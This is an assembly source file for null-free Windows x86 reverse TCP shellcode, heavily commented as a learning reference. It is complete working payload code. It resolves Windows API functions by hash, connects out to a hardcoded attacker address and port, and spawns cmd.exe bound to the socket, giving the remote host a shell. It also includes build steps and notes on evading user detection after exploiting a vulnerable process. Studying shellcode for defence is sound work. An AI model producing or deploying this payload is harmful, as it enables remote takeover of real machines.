; win-reverse-tcp-x86_32.s
; Basic Windows Reverse TCP (connectback) Shellcode for x86 instruction set.
; 343 bytes null-free shellcode for Windows 7+ (x86).
;
; This shellcode has been successfully tested on:
; [X] Windows 7 Ultimate 6.1.7601 Service Pack 1 Build 7601 (x86)
;
; Written by e3prom (github.com/e3prom)
; Based on the 2003 paper named 'Understanding Windows Shellcode' by Skape.
; From Windows 7 onward, the kernel32.dll module handler is listed third in the
; load module list and not second as it were the case with previous versions of
; the windows operating system.
;
; Notes
; -----
; Keep in mind this shellcode has only been optimized for being null-byte free
; and is certainly not short. Nothing novel here, except it could be used as a
; reference for understanding how shellcode on Windows works and what you could
; possibility do with the Windows API.
;
; The call to ExitProcess() is optional and must be even avoided in some cases.
; If you want to leverage it, simply uncomment the instruction at the end of
; this source file.
;
; The call to CreateProcess() may be expensive but allow the shellcode to be
; spawned as a new process, detached from the vulnerable parent. If the latter
; crashed due to let's say an access violation, the shellcode should stay
; alive and may even be without user detection.
;
; Assembly
; --------
; Assembly Instructions for buidling a PE/COFF executable on Linux:
;  nasm -f win32 win-reverse-tcp-x86_32.s -o win-reverse-tcp-x86_32.obj
;  /usr/bin/i686-w64-mingw32-gcc-win32 -m32 win-reverse-tcp-x86_32.obj -o \
;  win-reverse-tcp-x86_32.exe
;  objdump -d win-reverse-tcp-x86_32.exe
;
; Assembly and convertion as hex escaped string:
;  nasm win-reverse-tcp-x86_32.s -o win-reverse-tcp-x86_32.o
;  xxd -ps win-reverse-tcp-x86_32.o | xcp
;
BITS 32

section .text
  global _main

  ; ---- Getting kernel32.dll base address ----
  ; The 'FS' segment register holds a pointer to the PEB location at offset
  ; FS:[0x30]. Thanks to the Process Environement Block (PEB) which holds the
  ; list of loaded modules (hmodules). On Windows 7 and higher, the 3rd entry
  ; is always of 'kernel32.dll'. The latter has the 'LoadLibraryA' function we
  ; will need to load libraries and get their base address in memory.
  ;
  ; PEB (FS:[0x30]) -> Ldr -> Ldr.3rd.module dereference
  _main:
    ; Using the PEB to find the kernel32.dll base address.
    xor eax, eax		; Zero out the EAX register.
    mov eax, [fs:eax+0x30]	; Copy the address of the PEB to EAX.
    mov eax, [eax+0x0c]		; Pointer to the loader data structure in PEB.
    mov esi, [eax+0x14]		; Copy 3rd entry in the module list.
                                ; On Win7+ kernel32.dll is listed 3rd.
    lodsd			; Load DOUBLEWORD at address ESI into EAX.
    xchg esi, eax		; Swap EAX and ESI.
    lodsd			; Load DOUBLEWORD a second time using ESI.
    mov eax, [eax+0x10]         ; Read the kernel32.dll base address at
				; address EAX+0x10 and copy it in EAX.
    push eax			; Save the absolute base address of
				; kernel32.dll in the stack.

  ; Initiating search for LoadLibraryA().
  find_loadlibrary_func:
    xchg eax, edi		; Swap EAX for EDI so kernel32.dll base address
				; becomes the first argument to find_func().
    mov esi, 0xec0e4e8e		; Push LoadLibraryA hash onto the stack.
    xor ecx, ecx		; Zero out ECX.
    inc ecx			; Increment ECX, to set find_func_loop()'s
				; 'direct' flag to 1.

  ; ---- Starting Function Resolution Process ----
  ; The Library's base address is pushed onto the stack and given as the last parameter.
  ; Arguments list: <library's base address>, <function's hash>, <flags>
  find_func_loop:
    pushad			; Save all general CPU registers onto the
				; stack.

    ; Symbol Address Resolution - library EAT enumeration.
    mov ebp, [esp]		; Read address of the library as found in the
				; top of the stack and copy it in EBP.
    mov eax, [ebp+0x3C]		; Skip over to the start of the module's PE
				; header. EAX = start of PE Header.
    mov edx, [ebp+eax+0x78]	; Copy the start of the EAT to EDX.
                                ; EDX = Relative offset of EAT.
    add edx, ebp		; EDX = Absolute address of EAT.
    mov ecx, [edx+0x18]		; Copy the number of EAT entries into ECX.
    mov ebx, [edx+0x20]		; Store the name table relative offset in EBX.
				; EBX = Relative offset of name table.
    add ebx, ebp		; Make the name table address absolute.
				; EBX = Absolute address of name table.

  enum_func_loop:
    jecxz find_func_loop_end	; Jump to end of find function if ecx is zero.
    dec ecx			; Decrement ECX.
    mov esi, [ebx+ecx * 4]	; Copy the relative offset of the name
				; associated with the current symbol in ESI.
				; ESI = Relative offset of current func. name.
    add esi, ebp		; ESI = Absolute address of current func. name.

  init_hash:
    xor edi, edi		; Zero out EDI.
    xor eax, eax		; Zero out EAX.
    cld				; Clear the direction flag, to ensure it
				; increments. May be optional.
  compute_hash_loop:
    lodsb			; Load the symbol name at ESI into AL and
				; increment ESI.
    test al, al			; Bitwise test the AL register to test if the
				; end of the symbol string has been reached.
    jz compute_hash_end		; If ZF flag set, jump to the end of the hash
				; calculation function.
    ror edi, 0xd		; Rotate the current value of the hash, 13 bits
				; to the right.
    add edi, eax		; Add the current symbol character to EDI.
    jmp compute_hash_loop	; Continue looping through the symbol name.

  compute_hash_end:
    cmp edi, [esp+0x04]		; Perform a comparison of the computed hash in
				; EDI with the hash stored on the stack. 
    jnz enum_func_loop		; If above doesn't match, loop back and
				; continue the library's functions enumeration.
    mov ebx, [edx+0x24]		; Copy table relative offset of ordinal table.
				; EBX = relative offset of ordinal table.
    add ebx, ebp		; EBX = absolute address of ordinal table. 
    mov cx, [ebx+2 * ecx]	; CX = ordinal nuumber of matched function.
    mov ebx, [edx+0x1c]		; Extract the relative offset of address table.
    add ebx, ebp		; EBX = absolute address of address table.
    mov eax, [ebx+4 * ecx]	; Copy relative offset of matched function. 
    add eax, ebp		; EAX = absolute address of match function.
				; e,g. kernel32.LoadLibraryA VMA

  find_func_loop_end:
    mov [esp+0x1c], eax		; Overwrite the saved EAX value before 'popad'
				; so we keep the VMA address.
    popad			; Restore registers from the stack.
				; EAX returns the library's base address.
    test ecx, ecx		; Bit-wise operation to test if ECX is zero.
    jnz load_winsock_dll	; If non-zero, the 'direct' flag is set
				; therefore jump directly to load the winsock
				; dll, otherwise, return to the caller.
    retn			; RETurn to the caller.

  ; ---- Socket Creation Process (Reverse TCP) ----
  ; To establish a reverse tcp connection back to us, we must:
  ; 1.  Load the winsock 'ws2_32.dll' in memory and get its base address.
  ; 2a. Call WSAStartup to initialized winsock, it has not been done already.
  ; 2b. Create a socket using 'WSASocketA' function (0xadf509d9).
  ; 3.  Connect to the remote host using the 'connect' function (0x60aaf9ec).
  ; 4.  Execute command interpreter using 'Createprocess()' (0x16b3fe72).
 
  ; Call to LoadLibraryA to load and get address of Winsock ws2_32.dll.
  ; HMODULE WINAPI LoadLibrary(
  ;   _In_ LPCTSTR lpFileName
  ; );
  load_winsock_dll:
    push eax			; Keep a copy of EAX onto the stack.
				; Which is the start address of LoadLibraryA().
    xor eax, eax		; Zero out EAX to have the string null
				; terminated and to ensure it's unclobbered.
    mov ax, 0x3233		; Set the least-significant byte of EAX to 32.
    push eax			; Push EAX onto the stack -> '00003233'.
    push 'ws2_'			; Push the start of the string onto the stack.
    mov edi, esp		; Copy the pointer to the string in EDI.
    mov eax, [esp+0x08]		; Restore EAX from the stack at offset 0x08.

  ; Load library into memory using the kernel32.dll's LoadLibraryA() function
  ; and get its base address in memory.
  ; Argument list: <.DLL filename>
  load_library:
    pushad			; Save all registers before function call to
				; 'LoadLibraryA' so their remain unclobbered.
    call [esp+0x1C]		; Call LoadlibraryA from the memory address in
				; stack. The first argument is taken from EDI
				; which is at the top of the stack.
    push 0xDEC0ADDE		; (filler to accomodate call to LoadlibraryA)
    mov [esp+0x1C], eax		; Overwrite the saved EAX value before 'popad',
				; here EAX is the base address of the loaded
				; library as returned by LoadlibraryA.
    popad			; Restore all general CPU registers after call.

  ; Initialize WinSock subsystem.
  ; This is not necessary if the target application has already initialized a
  ; socket which should be the case during remote exploitation.
  ; int WSAStartup(
  ;   _In_  WORD      wVersionRequested,
  ;   _Out_ LPWSADATA lpWSAData
  ; );
  ;
  ; Enumerate the Winsock library for the 'WSAStartup' function.
  init_winsock:
    push eax			; Keep a copy of the WinSock base address.
    mov edi, eax		; Copy the address of WinSock in EAX to EDI.
    mov esi, 0xadf509ef		; Copy the hash of 'WSAStartup' into ESI.
    xor ecx, ecx		; Zero out, so the func_func_loop's 'direct'
				; flag is set to zero. 
    call find_func_loop		; Call the find_func_loop function. 
				; ** It looks like the absolute positon of
				; 'WSAStartup' is wrong on Win7 x86. The
				; function is in fact at offset -221.
    mov cx, 0x221		; Set the CX register to the byte value 0x221
				; to avoid null byte in the next instruction.
    sub eax, ecx		; Correct above issue by ajusting the VMA
    mov cx, 0x190		; Set the CX register to the byte value 0x190.
    sub esp, ecx		; We need to make some stack space for WSADATA.
				; sizeof(WSADATA) is 0x190.
    mov ebp, esp		; Ajust stack frame.
    push esp			; Placeholder for 'lpWSAData' (out) parameter.
				; WSAStartup will write at ESP position.
    push 0x02			; Set argument 'lpWSAData' to 2.
    call eax			; Call WSAStartup with its base address in EAX.
				; From now on, Winsock is initialized.
    xor ecx, ecx		; Zero out ECX again as it has been clobbered
				; by the above WSAStartup function.
    mov cx, 0x190		; Set the CX register to the byte value 0x190,
				; the size of the the WSADATA structure.
    add esp, ecx		; Readjust the stack frame using the value in
				; the CX register. 
    pop eax			; Restore EAX register with address of Winsock.

  ; Create socket using 'WSASocketA' function.
  ; WSASocket Prototype:
  ; SOCKET WSASocket(
  ;   _In_ int                af,
  ;   _In_ int                type,
  ;   _In_ int                protocol,
  ;   _In_ LPWSAPROTOCOL_INFO lpProtocolInfo,
  ;   _In_ GROUP              g,
  ;   _In_ DWORD              dwFlags
  ; );
  ;
  ; Create the socket using the WinSock API.
  create_socket:
    xor ecx, ecx		; Zero out ECX, so the find_func_loop's
				; 'direct' flag will be set to zero.

    ; Enumerate the Winsock library for the 'WSASocketA' function.
    mov edi, eax		; Copy the address of WinSock in EAX to EDI.
    mov esi, 0xadf509d9		; Copy the hash of 'WSASocketA' into ESI.
    call find_func_loop		; Call the find_func function.
    push eax			; Push the resolved function address onto the
				; stack.

    ; Enumerate the Winsock library for the 'connect' function.
    ;mov edi, [esp+0x04]	; Copy the address of Winsock back to EDI. 
    mov esi, 0x60aaf9ec		; Copy the hash of 'connect' into ESI.
    call find_func_loop		; Call the find_func function.
    push eax			; Push the resolved function address onto the
				; stack.

    ; Enumerate the kernel32.dll library for the 'CreateProcessA' function.
    mov edi, [esp+0x14]		; Copy the base address of kernel32.dll from
				; the stack at offset 0x0C to EDI.
    mov esi, 0x16b3fe72		; Copy the hash of 'CreateProcessA' into ESI.
    call find_func_loop		; Call the find_func function.
    push eax			; Push the resolved function address onto the
				; stack.

    ; Enumerate the kernel32.dll library for the 'ExitProcess' function.
    ;mov edi, [esp+0x18]	; Copy the base address of kernel32.dll from
				; the stack at offset 0x0C to EDI.
    mov esi, 0x73e2d87e		; Copy the hash of 'ExitProcess' into ESI.
    call find_func_loop		; Call the find_func function.
    push eax			; Push the resolved function address onto the
				; stack.

  define_socket:
    xor eax, eax		; Zero out EAX to be used later as a null
				; argument string.
    push eax			; Push the 'dwFlags' arg as '0' onto the stack.
    push eax			; Push the 'g' argument as '0' onto the stack.
    push eax			; Push the 'lpProtocolInfo, argument as NULL.
    push eax			; Push the 'protocol' arg as '0' (IPPROTO_IP).
    inc eax			; Increment EAX to 1.
    push eax			; Push the 'type' arg. as '1' (SOCK_STREAM).
    inc eax			; Increment EAX to 2.
    push eax			; Push the 'af' argument as '2' (AF_INET).
    call [esp+0x24]		; Call to the resolved 'WSASocketA' function.
   				; EAX = Socket file descriptor.
    mov esi, eax		; Copy the WSASocket file descriptor to ESI.

  ; Establish the reverse TCP connection to the remote host.
  establish_socket:
    push 0xB102010A		; Push remote address (LHOST) onto the stack.
				; The IP here is hardcoded to '10.1.2.177'.
    mov eax, 0x697A0102		; The 2nd byte is set at 0x01 to avoid null
				; byte. The Port is in the left most four
				; bytes of the EAX register.
				; The port here is hardcoded to '31337'. 
    dec ah			; Decrement the second byte of EAX to set the
				; address-family to AF_INET (0).
    push eax			; Push the port and family onto the stack.
    mov ebx, esp		; Copy pointer to the struct socketaddr_in
				; that has been pushed onto the stack above
				; into the EBX register.
    xor eax, eax		; Zero out EAX.
    mov al, 0x10		; Set the low-order byte to 16, the size of the
				; struct 'sockaddr_in'.
    push eax			; Push the 'namelen' argument as '16' onto the stack.
    push ebx			; Push the 'name' argument with pointer to the
				; sockaddr_in struct onto the stack. 
    push esi			; Push the 's' argument which has been
				; previously set to the WSASocket's
				; file descriptor.
    call [esp+0x1C]		; Call 'connect' function.
				; From here the socket should have established
				; a connection to the remote host.

  ; Initialize the command to be instantied with the child process.
  init_cmd:
    mov eax, '1cmd'		; Set EAX to 0x01'cmd'. The low-order byte is
				; set to 0x01 to avoid using a null byte.
    sar eax, 0x08		; Shift EAX to the right 8 bits to create a
				; null after the 'cmd' string.
    push eax			; Push the command string onto the stack.
    push esp			; Save the pointer to the command string.

  ; Initialize the STARTUPINFO and PROCESS_INFORMATION structures necessary
  ; for CreateProcessA().
  init_struct:
    xor ecx, ecx		; Zero out the ECX register.
    mov cl, 0x54		; Set low-order byte of ECX to 0x54, which is
				; the size of STARTUPINFO and
				; PROCESS_INFORMATION structures.
    sub esp, ecx		; Adjust stack frame size to accomodate the
				; above structure.
    mov edi, esp		; Set EDI to the top of the stack where
				; the STARTUPINFO structure is located.
    push edi			; Push EDI onto the stack for later retrieval.
    xor eax, eax		; Zero out EAX to be used below with stosb
				; instruction to zeroize the struct buffer.
    rep stosb			; Store zero at the buffer starting at EDI
				; until ECX is zero.
    pop edi			; Restore EDI to its original value which is
				; the start of the STARTUPINFO structure.
    mov byte [edi], 0x44	; Set the 'cb' attribute of STARTUPINFO to
				; 0x44 which is the size of the structure.
    inc byte [edi + 0x2d]	; Set the STARTF_USESTDHANDLES flag to indicate
				; that the 'hStdInput', 'hStdOuput' and 'hStdError'
				; attributes should be used.
    push edi			; Store EDI on the stack again as stosd below
				; will overwrite it.
    mov eax, esi		; Set eax to the file description returned by
				; WSASocket above (the register has been
				; untouched up to here).
    lea edi, [edi + 0x38]	; Set the address of 'hStdInput' attribute in
				; the STARTUPINFO structure.
    stosd			; Set the 'hStdInput' attribute to the file
				; descriptor as returned by 'WSASocket'.
    stosd			; Set the 'hStdOutput' attrivute to the file
				; descriptor as returned by 'WSASocket'.
    stosd			; Set the 'hStdError' attribute to the file
				; descriptor as returned by 'WSASocket'.
    pop edi			; Restore EDI.

 ; Execute the child process that will redirect standard input, standard
 ; output and standard error to the socket via its file descriptor.
 ; BOOL WINAPI CreateProcess(
 ;   _In_opt_    LPCTSTR               lpApplicationName,
 ;   _Inout_opt_ LPTSTR                lpCommandLine,
 ;   _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
 ;   _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
 ;   _In_        BOOL                  bInheritHandles,
 ;   _In_        DWORD                 dwCreationFlags,
 ;   _In_opt_    LPVOID                lpEnvironment,
 ;   _In_opt_    LPCTSTR               lpCurrentDirectory,
 ;   _In_        LPSTARTUPINFO         lpStartupInfo,
 ;   _Out_       LPPROCESS_INFORMATION lpProcessInformation
 ; );
 exec_process:
   xor eax, eax			; Zero out EAX.
   lea esi, [edi + 0x44]	; Set the address of PROCESS_INFORMATION
				; structure into esi.
   push	esi			; Push the pointer to the
				; 'lpProcessInformation' structure.
   push edi			; Push the pointer to the 'lpStartupInfo'
				; structure.
   push eax			; Push the 'lpStartupDirectory' arg as NULL.
   push eax			; Push the 'lpEnvironment' argument as NULL.
   push eax			; Push the 'dwCreationFlags' argument as '0'.
   inc eax			; Increase EAX to '1'.
   push eax			; Push the 'bInheritHandles' argument as TRUE.
   dec eax			; Decrease EAX to '0'.
   push eax			; Push the 'lpThreadAttributes' argument as
				; NULL onto the stack.
   push eax			; Push the 'lpProcessAttributes' argument as
				; NULL onto the stack.
   push dword [esp + 0x74]	; Push the 'lpCommandLine' argument as a
				; pointer to 'cmd'.
   push eax			; Push the 'ldApplicationName' argument as NULL
				; onto the stack.
   call [esi + 0x24]		; Call the 'CreateProcessA' function to create
				; a child process. ESP+0x90 could have been
				; used but the operand includes null bytes.

 ; Gracefully exit parent process (optional).
 ;exit_process:
 ;  call [esp + 0x64]		; Call the 'ExitProcess' function to exit the
				; parent process gracefully.
